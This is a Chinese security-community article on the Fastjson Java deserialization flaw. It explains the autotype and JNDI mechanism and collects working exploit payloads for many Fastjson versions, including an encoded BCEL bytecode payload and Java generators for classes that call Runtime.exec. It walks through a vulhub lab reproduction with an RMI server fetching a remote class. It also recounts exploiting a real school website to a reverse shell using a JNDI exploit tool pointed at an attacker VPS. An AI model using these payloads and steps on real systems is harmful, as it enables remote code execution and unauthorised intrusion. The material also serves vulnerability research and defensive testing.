# 分享Fastjson反序列化漏洞原理+漏洞复现+实战案例+POC收集-先知社区

> **来源**: https://xz.aliyun.com/news/16323  
> **文章ID**: 16323

---

## 0x1 前言

哈喽师傅们，这篇文章自己写之前先是看了十几篇的Fastjson反序列化漏洞相关的文章，自己也是先学习了一遍，然后才写的这篇文章，这篇文章主要是分享Fastjson反序列化漏洞原理+漏洞复现+实战案例+POC收集，然后从不同的方面去介绍和利用Fastjson漏洞，特别是在收集POC的过程中，需要我们自己去验证它。还有就是复现相关Fastjson漏洞的时候对于我们本地的一个Java和jdk环境要求比较严格，最后面呢是以之前挖EDUSRC的一个学校的案例来给师傅们分享下实战中的Fastjson漏洞怎么利用。

![](images/20241223154904-61c3c7e0-c102-1.png)

## 0x2 Fastjson反序列化漏洞原理及介绍

### 一、浅谈

Fastjson反序列化漏洞也是一个知名度比较高的Java反序列化漏洞，他是阿里巴巴的开源库，下面我将主要带大家了解Fastjson反序列化漏洞的原理以及相关知识点的内容，然后带师傅们去利用rmi服务去复现这个Fastjson反序列化漏洞。

### 二、什么是json？

json是一种数据格式，对于我们互联网来说，我们服务器和客户端有大量的数据需要进行传输。以前通用的方式是xml，但是xml数据体重太大，效率低下，所以就有了另外一种数据格式，叫json。

**json一共有两种体现：**

* json对象、json数组
* json对象：json本身是一个字符串，{建：值, 建：值}

举例：

```
{
  "name" : "routing",
  "2003-11-11",
  "age" : 20,
  "likes" : ["看电影" , "看书"]
}

```

### 三、Fastjson概述

FastJson是啊里巴巴的的开源库，用于对JSON格式的数据进行解析和打包。其实简单的来说就是处理json格式的数据的。例如将json转换成一个类。或者是将一个类转换成一段json数据。

Fastjson 是一个 Java 库，提供了Java 对象与 JSON 相互转换。

* **toJSONString()方法**：（序列化）将json对象转换成JSON字符串；
* **parseObject()方法**：（反序列化）将JSON字符串转换成json对象。

使用方式：

```
//序列化
String text = JSON.toJSONString(obj); 
//反序列化
VO vo = JSON.parse(); //解析为JSONObject类型或者JSONArray类型
VO vo = JSON.parseObject("{...}"); //JSON文本解析成JSONObject类型
VO vo = JSON.parseObject("{...}", VO.class); //JSON文本解析成VO.class类

```

### 四、Fastjson漏洞原理

fastjson为了读取并判断传入的值是什么类型，增加了autotype机制导致了漏洞产生。

由于要获取json数据详细类型，每次都需要读取`@type`，而@type可以指定反序列化任意类调用其`set`，`get`，`is`方法，并且由于反序列化的特性，我们可以通过目标类的set方法自由的设置类的属性值。

那么**攻击者只要准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口从攻击者控制的web服务器远程加载恶意代码并执行，形成RCE。**

【JNDI提供了查找和访问各种命名和目录服务的通用、统一的接口。支持的服务：DNS，LDAP，RMI，CORBA等】

关于JNDI注入，大家可以看我之前写的一篇关于log4j的JNDI注入漏洞的详细介绍：

<https://blog.csdn.net/SENMINGya/article/details/136819823?spm=1001.2014.3001.5502>

### 五、Fastjson漏洞利用详解

1、攻击者（我们）访问存在fastjson漏洞的目标靶机网站，通过burpsuite抓包改包，以json格式添加com.sun.rowset.JdbcRowSetImpl恶意类信息发送给目标机。

2、存在漏洞的靶机对json反序列化时候，会加载执行我们构造的恶意信息(访问rmi服务器)，靶机服务器就会向rmi服务器请求待执行的命令。也就是靶机服务器问rmi服务器，（靶机服务器）需要执行什么命令啊？

3、rmi 服务器请求加载远程机器的class（这个远程机器是我们搭建好的恶意站点，提前将漏洞利用的代码编译得到.class文件，并上传至恶意站点），得到攻击者（我们）构造好的命令（ping dnslog或者创建文件或者反弹shell啥的）

4、rmi将远程加载得到的class（恶意代码），作为响应返回给靶机服务器。

5、靶机服务器执行了恶意代码，被攻击者成功利用。

这里给大家看看红队大佬的图解，希望对大家理解fastjson漏洞原理的利用有帮助。

![](images/20241223155551-5446023a-c103-1.png)

## 0x3 Fastjson漏洞POC收集

### 一、Fastjson 1.2.24版本

**TemplatesImpl 反序列化**

最终`Poc`为

```
{
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": ["恶意字节码"],
    "_name": "test",
    "_tfactory": {},
    "_outputProperties": {},
}

```

**JdbcRowSetImpl 反序列化**

最终`Poc`为

```
{  

  "@type":"com.sun.rowset.JdbcRowSetImpl",  

  "dataSourceName":"ldap://127.0.0.1:1234/Exploit",  

  "autoCommit":true  

}

```

### 二、Fastjson 1.2.25版本

附上`Poc`

```
{  

  "@type":"[com.sun.rowset.JdbcRowSetImpl;",  

  "dataSourceName":"ldap://127.0.0.1:1234/Exploit",  

  "autoCommit":true  

}  

或   

{  

  "a":{  

    "@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",  

    "dataSourceName":"rmi://test.com:9999/TouchFile",  

    "autoCommit":true  

  }  

}

```

### 三、Fastjson 1.2.42版本

最终`Poc`，添加`两个类描述符`

```
{  

  "@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",  

  "dataSourceName":"ldap://127.0.0.1:1234/Exploit",  

  "autoCommit":true  

}

```

### 四、Fastjson 1.2.43版本

附上`poc`

```
{
    "@type":"[com.sun.rowset.JdbcRowSetImpl"[,
    {"dataSourceName":"ldap://127.0.0.1:1234/Exploit",
    "autoCommit":true
}

或
{
    "b":{
        "@type":"[com.sun.rowset.JdbcRowSetImpl"[{,
        "dataSourceName":"rmi://test.com:9999/TouchFile",
        "autoCommit":true
    }
}

```

### 五、Fastjson 1.2.45版本

分析版本来到`fastjson1.2.45`，此版本升级后，存在一个`黑名单匹配绕过`，绕过类

org.apache.ibatis.datasource.jndi.JndiDataSourceFactory

利用条件如下

1. 目标服务端存在`mybatis`的jar包。
2. 版本需为 `3.x.x ～ 3.5.0`
3. autoTypeSupport属性为true才能使用。（fastjson >= 1.2.25默认为false）

`Poc`如下

```
{  

  "@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",  

  "properties":{  

    "data_source":"ldap://127.0.0.1:1234/Exploit"  

  }  

}  

或  

{  

  "b":{  

    "@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",  

    "properties":{"data_source":"ldap://localhost:1389/Exploit"}  

  }  

}

```

### 六、Fastjson <=1.2.62 和 <=1.2.66版本

积累的两个`poc`,基于黑名单绕过`fastjson <= 1.2.62`

```
{  "@type":"org.apache.xbean.propertyeditor.JndiConverter",  "AsText":"rmi://127.0.0.1:1099/exploit"}";

```

基于`fastjson<=1.2.66`的poc

```
{  "@type":"org.apache.shiro.jndi.JndiObjectFactory",  "resourceName":"ldap://192.168.80.1:1389/Calc"  }

```

### 七、Fastjson 1.2.80版本

构造`poc`如下，成功弹出计算器

```
{
    "a": {
        "@type": "java.lang.Class",
        "val": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
    },
    "b": {
        "@type": "java.lang.Class",
        "val": "com.sun.org.apache.bcel.internal.util.ClassLoader"
    },
    "c": {
        "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
        "driverClassLoader": {
            "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        "driverClassName": "$$BECL$$$l$8b$I$A$A$A$A$A$A$AeP$bbN$CA$U$3d$D$cb$O$ac$8b$bc$c47$sV$82$854v$Q$h$a3$W$e2$pb$b4$k$c6$J$Z$5cv$c92$Y$fe$c8$9aF$8d$85$l$e0G$Z$efl$M$908$c5$7d$9c$c7$bd7$f3$fd$f3$f9$F$e0$Y$7b$k8J$k$ca$a8d$b1fs$95c$9dc$83c$93$c1m$ebP$9b$T$86t$bd$f1$c0$e0$9cFO$8a$a1$d0$d1$a1$ba$9e$M$7b$w$be$X$bd$80$90l$5b$G$7f$ca$7c$d7$I$f9$7c$rF$JE$b3$Y$bcn4$89$a5$3a$d7$89TMGG$D$f1$o$7cd$91$e3$d8$f2$b1$8d$j$9a$zE$m$7d$ec$a2$c6P$b1$7c3$Qa$bfy6$95jdt$U$d2$N$e4d$u$$$b8$9b$de$40I$c3PZ$40w$93$d0$e8$n$ad$f1$fa$ca$cc$9bj$bd$d1$f9$a7i$d1N5U$92$e1$a0$be$c4vM$ac$c3$7ek$d9p$hGR$8d$c7$z$ec$c3$a5$df$b2$_$Ff$cf$a7$e8QW$a3$cc$ug$O$df$c1fT0$acPt$T$d0$K$fd$b9$f4$o$b1$C$ab$lH$95$d3op$k_$e1$5c$ce$S$yG$ba$M$f1$d6$5b$86C$d1$n$ccM$d0$3c$z$ce$T$c2$91$eap$ac$da$b1$85$e4$8e$e2$_$M$c2$l$G$cb$B$A$A"
    }
}

```

### 八、bit4woo师傅汇总的POC

**参考文档：**

<https://github.com/bit4woo/code2sec.com/blob/master/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%E4%B8%83%EF%BC%9Afastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96PoC%E6%B1%87%E6%80%BB.md>

#### 1、基于com.sun.rowset.JdbcRowSetImpl的PoC1

该PoC需要使用JNDI，需要搭建web服务，RMI服务或LDAP服务，利用相对麻烦。但对于检测fastjson漏洞是否存在，这个却是最简单有效的（结合DNSlog）。

```
package fastjsonPoCs;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

/*
 * 基于JNDI的PoC,可用的JNDI服务器有RMI，ldap。
 * 
 */
public class PoC1JNDI {
  public static void main(String[] argv){
    String xx = payload();
  }

  public static String payload(){

    //JDK 8u121以后版本需要设置改系统变量
    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
    //LADP
    String payload1 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\"autoCommit\":true}";
    //RMI
    String payload2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/ref\",\"autoCommit\":true}";

    JSONObject.parseObject(payload2);
    JSON.parse(payload2);
    return payload2;
  }
}

```

以上poc共有三个触发点：静态代码块(Class.forName())、类实例化、和getObjectInstance()方法。

#### 2、基于com.sun.org.apache.bcel.internal.util.ClassLoader的PoC2

这个PoC是漏洞利用时最方便的，它不需要依赖JNDI等服务，所有内容一个请求中搞定。

```
package fastjsonPoCs;

import evilClass.*;
import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.bcel.internal.classfile.Utility;

/*
 * 基于org.apache.tomcat.dbcp.dbcp.BasicDataSource的PoC，当然也可以说是基于com.sun.org.apache.bcel.internal.util.ClassLoader的PoC
 * 前者的主要作用是触发，也就是包含Class.forName()函数的逻辑(createConnectionFactory函数中)；后者是类加载器，可以解析特定格式的类byte[]。
 * 
 * 
 * org.apache.tomcat.dbcp.dbcp.BasicDataSource ----- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp 比如tomcat-dbcp-7.0.65.jar
 * org.apache.tomcat.dbcp.dbcp2.BasicDataSource ----- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp 比如tomcat-dbcp-9.0.13.jar
 * org.apache.commons.dbcp.BasicDataSource ----- https://mvnrepository.com/artifact/commons-dbcp/commons-dbcp
 * org.apache.commons.dbcp2.BasicDataSource ----- https://mvnrepository.com/artifact/org.apache.commons/commons-dbcp2
 * 
 * 主要参考：https://xz.aliyun.com/t/2272
 */
public class PoC2dbcp {
  public static void main(String[] argv){
    String xx = payload2();
  }

  public static String payload2() {
    //payload3:https://xz.aliyun.com/t/2272
    try {
      String payload2 = "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"xxxxxxxxxx\"}}:\"ddd\"}";
//      payload3 = "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"xxxxxxxxxx\"}}:\"ddd\"}";
//      payload3 = "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"xxxxxxxxxx\"}}:\"ddd\"}";
//      payload3 = "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.commons.dbcp2.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"xxxxxxxxxx\"}}:\"ddd\"}";
      byte[] bytecode = createEvilClass.create("evil","calc");
      String classname = Utility.encode(bytecode,true);
      //System.out.println(classname);
      classname = "org.apache.log4j.spi$$BCEL$$"+classname;
      payload2 = payload2.replace("xxxxxxxxxx", classname);

//      ClassLoader cls = new com.sun.org.apache.bcel.internal.util.ClassLoader();
//      Class.forName(classname, true, cls);
      JSONObject.parseObject(payload2);
      return payload2;
    } catch (Exception e) {
      e.printStackTrace();
      return null;
    }
  }
}

```

#### 3、基于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl的PoC3(来自廖新喜)

这个PoC有限制，需要引用程序是如下写法：

```
JSON.parseObject(payload3, Object.class, config, Feature.SupportNonPublicField)

```

在实际的环境中基本遇不到，但其中的思路还是值得学习的。

```
package fastjsonPoCs;

import org.apache.commons.codec.binary.Base64;
import javassist.ClassPool;
import javassist.CtClass;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

/*
 * 该poc来自于廖新喜大佬的文章：http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/
 * 基于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，构造的恶意类需要是继承了AbstractTranslet的。
 */
public class PoC3TemplatesImpl {
  public static void main(String[] argv){
    String xx = payload3();
  }

  public static String payload3() {
    try {
      //http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/
      String payload3 = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\": [\"xxxxxxxxxx\"], \"_name\": \"1111\", \"_tfactory\": { }, \"_outputProperties\":{ }}";
      byte[] bytecode1 = Gadget.createEvilBytecode("calc");
      String className = TemplatesImpl.class.getName();//com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
      payload3 = payload3.replace("xxxxxxxxxx", Base64.encodeBase64String(bytecode1));

      System.out.println(payload3);
      ParserConfig config = new ParserConfig();
      Object obj = JSON.parseObject(payload3, Object.class, config, Feature.SupportNonPublicField);

      return payload3;
    } catch (Exception e) {
      e.printStackTrace();
      return null;
    }
  }
}


class Gadget {

    public static class evil extends AbstractTranslet{
      @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { }
    }

    static byte[] createEvilBytecode(final String command) throws Exception {
        ClassPool classPool = ClassPool.getDefault();

        // 获取class
        System.out.println("ClassName: " + evil.class.getName());
        final CtClass clazz = classPool.get(evil.class.getName());

        // 插入静态代码块，在代码末尾。
        clazz.makeClassInitializer().insertAfter(
                "java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");"
        );
        clazz.setName("evilxxx");//类的名称，可以通过它修改。

        clazz.writeFile("D:\\");//将生成的.class文件保存到磁盘
        // 获取bytecodes
        final byte[] classBytes = clazz.toBytecode();
        return classBytes;
    }
}

```

## 0x4 Fastjson自动化检测插件

### 一、BurpFastJsonScan插件

这里呢我就给师傅们推荐下两款burpsuit上面的自动化检测fastjson的插件，这两个插件会对BurpSuite传进来的带有json数据的请求包进行检测，对于像我这样上班爱摸鱼的马楼来讲还是蛮适合的，哈哈哈。

首先，介绍的是BurpFastJsonScan 这款插件是一个希望能节省一些渗透时间好进行划水的扫描插件，该插件会对BurpSuite传进来的带有json数据的请求包进行检测。

目前的功能如下：

* 命令回显
* 远程命令执行

下载链接：<https://github.com/pmiaowu/BurpFastJsonScan>

安装这个插件也很简单，无脑操作如下：

![](images/20241223155743-96d560a0-c103-1.png)

这里就来简单的介绍下他这款工具的一个检测规则吧

* POST 的内容为json
* GET 的参数内容为json
* POST 的参数内容为json
* Cookie 的参数内容为json

```
例子:
GET, POST, Cookie 有个参数 json
json = {"aaa":"66666"}
那么就会去检测
json的这种就是请求包的内容直接就是json不带参数的那种, 也会去检测
```

![](images/20241223155755-9e30ff8a-c103-1.png)

### 二、FastjsonScan插件

FastjsonScan插件是一个简单的Fastjson反序列化检测burp插件，其实跟上面那个使用起来都是差不多的，区别在于插件检测的效率可能不一样，两个插件我都是推荐jdk1.8的环境，其实不光的fastjson漏洞要利用jdk1.8，你在复现好多Java反序列化漏洞的时候都是需要这个版本环境的，到文末我也会给师傅们推荐一个文章，去如何安装jdk1.8的环境。

工具下载链接：<https://github.com/Maskhe/FastjsonScan?tab=readme-ov-file>

安装和使用都和上面的插件差不多，这里给师傅们看看使用FastjsonScan插件扫描结果界面：

![](images/20241223155809-a64d23e2-c103-1.png)

## 0x5 Fastjson环境搭建+漏洞复现

### 一、环境搭建

靶机：Ubantu IP 192.168.103.161 （先要安装docker，然后下载vulhub） 启动vulhub里面的fastjson环境

攻击机：kali IP 192.168.103.129

我们先利用Ubantu进入vulnhub靶场，进入/vulhub/fastjson/1.2.24-rce目录下，然后执行以下命令，看到done，那么就表示环境开启成功了。

```
docker-compose up -d

```

![](images/20241223155821-addc7522-c103-1.png)

查看我们ubantu中docker开启环境的端口情况，端口是8090

```
docker ps -a

```

![](images/20241223155833-b51d02e8-c103-1.png)

我们访问 ubantu的IP+端口，192.168.103.161:8090，得到如下的界面：

![](images/20241223155843-bacd1ed0-c103-1.png)

### 二、漏洞复现

#### 1、远程创建文件

一、这里要创建java代码文件，所以对环境比较严格，要保证java和javac的版本一致，且都是1.8的版本！！！

![](images/20241223155857-c2fc55f8-c103-1.png)

二、我们先在本地把java代码文件编译好，然后再上传到攻击机：kali下保存以下代码为TouchFile.java文件

```
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/successFrank"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}

```

![](images/20241223155913-ccee390a-c103-1.png)

三、编译.java文件，生成.class文件。

```
javac TouchFile.java

```

![](images/20241223155925-d3a21c3a-c103-1.png)

四、然后我们再把编译好的.class文件上传到攻击机kali目录下

![](images/20241223155938-db73712a-c103-1.png)

五、在class文件所在的目录，Python起一个http服务。用4444端口启动http服务的命令为：

```
┌──(root-kali)-[~/桌面/fastjson]
└─# python -m http.server 4444

```

![](images/20241223155951-e388d530-c103-1.png)

六、访问kali的IP+开启http服务的4444端口，就会出现下面的页面

![](images/20241223160008-ed6f78d8-c103-1.png)

#### 2、开启RMI服务

一、开启rmi服务之前，我们需要利用marshalsec项目，需要用到marshalsec-0.0.3-SNAPSHOT-all.jar工具，下载链接如下：<https://github.com/bkfish/Apache-Log4j-Learning/tree/main/tools>

![](images/20241223160034-fd2bf9f4-c103-1.png)

二、接下来使用marshalsec项目，启动RMI服务，监听9999端口并加载远程类TouchFile.class：

开启RMI服务，命令行中的IP地址是kali攻击机开始开启http服务的地址

```
┌──(root-kali)-[~/桌面/Apache-Log4j-Learning-main/tools]
└─# java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.103.129:4444/#TouchFile" 9999

```

![](images/20241223160047-04fbc0ec-c104-1.png)

三、利用burp抓取靶机ubantu（192.168.103.161:8090）的包，然后再改变抓到的包的请求方式为POST，然后再发送到Repeater中。

![](images/20241223160057-0abe88a2-c104-1.png)

四、添加payload，师傅们可以参考我这个请求包的内容，因为我开始在网上找了很多，然后rmi服务监听都没有回应，都失败了。

```
POST / HTTP/1.1
Host: 192.168.103.161:8090
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh,zh-CN;q=0.9
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 165

{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.103.129:9999/TouchFile",
        "autoCommit":true
    }
}

```

主要是看这两个地方，圈起来的是主要payload，然后看是否成功执行了，就看返回包中是否回显500关键字。

![](images/20241223160153-2c148bdc-c104-1.png)

然后可以看到rmi服务的监听和开启的http服务都有回应了。

![](images/20241223160208-351a8df8-c104-1.png)

![](images/20241223160214-38724f18-c104-1.png)

五、我们开始的TouchFile.java这个脚本文件，我们是让他执行touch /tmp/successFrank 目录文件，我们来看看是否执行成功了。

![](images/20241223160224-3eb67b60-c104-1.png)

详细步骤如下：

```
1、docker ps  //找到CONTAINER ID

2、docker exec -it CONTAINER ID /bin/bash   //就可以进入CONTAINER ID当前目录下了

3、cd /tmp  

4、ls   //就可以看到创建的successFrank文件了

```

![](images/20241223160241-489c349e-c104-1.png)

目前，我们就把漏洞复现成功了！！！

## 0x6 实战案例分享

上面使用vulhub靶场镜像复现了fastjson漏洞1.2.24-rce版本的，下面就给师傅们分享下我之前挖EDUSRC漏洞的时候碰到的fastjson<=1.2.47版本的fastjson漏洞，当时也是顺利使用fastjson\_tool去构造fastjson<=1.2.47左右的利用链成功，然后打了一个rce，最后提交了EDUSRC漏洞平台

![](images/20241223160300-53b782c0-c104-1.png)

当时是在逛一个学校的虚拟仿真实验室首页，然后看到这里仿真实验，然后点进去

![](images/20241223160313-5b84033e-c104-1.png)

但是这里点击使用平台需要我们输入账户密码，但是这里也有一个注册接口，然后这里我也就是正常的注册一个用户，然后再登录，输入账户和密码

![](images/20241223160323-61a212ba-c104-1.png)

像这样的登录口，有什么记住密码选项或者登录框，我常会直接打开我的burpsuit插件，比如shiroscan和上面介绍的fastjsonscan插件进行一个自动化扫描。

这里我们可以看到，burpsuit的fastjsonscan插件扫出改登录口存在fastjson漏洞，通过利用链可看出该fastjson版本在1.2.47左右,这里我们直接使用

![](images/20241223160334-6859ec9a-c104-1.png)

然后可以使用JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar这个工具生成JNDI链接的工具可以启动多个服务器来利用JNDI注入漏洞，然后打fastjson漏洞

下载链接：<https://github.com/welk1n/JNDI-Injection-Exploit>

```
java -jar https://github.com/welk1n/JNDI-Injection-Exploit -C '[command]ping dnslog.cn' -A vps_ip

```

后面就是常规的步骤了，这里也是成功反弹shell了

![](images/20241223160346-6f48d98a-c104-1.png)

## 0x7 总结

到这里呢这篇Fastjson漏洞相关的分享就结束了，这里祝愿师傅们多挖洞，多出洞！

然后呢，下面就是文章中出现的一些文章链接，比如jdk1.8的安装教程包括vulnhub的一个安装，还有就是参考文章之类的，包括上面文字中介绍用到的工具之类的下载链接。

JDK1.8安装详细教程：<https://blog.csdn.net/m0_54899775/article/details/122420533>

安装vulnhub详细教程：<https://blog.csdn.net/m0_54899775/article/details/122463532>

哔哩哔哩视频讲解：【fastjson反序列化漏洞演示加详细讲解加原理】 <https://www.bilibili.com/video/BV1Ab4y1d7w1/?share_source=copy_web&vd_source=268f8d699ac32cf11e9bdc248399c5bd>

参考文章：

<https://github.com/bit4woo/code2sec.com>

<https://xz.aliyun.com/t/14872>

burpsuit插件及工具下载：

<https://github.com/pmiaowu/BurpFastJsonScan>

<https://github.com/Maskhe/FastjsonScan?tab=readme-ov-file>

<https://github.com/welk1n/JNDI-Injection-Exploit>

**文章中涉及的敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担。**
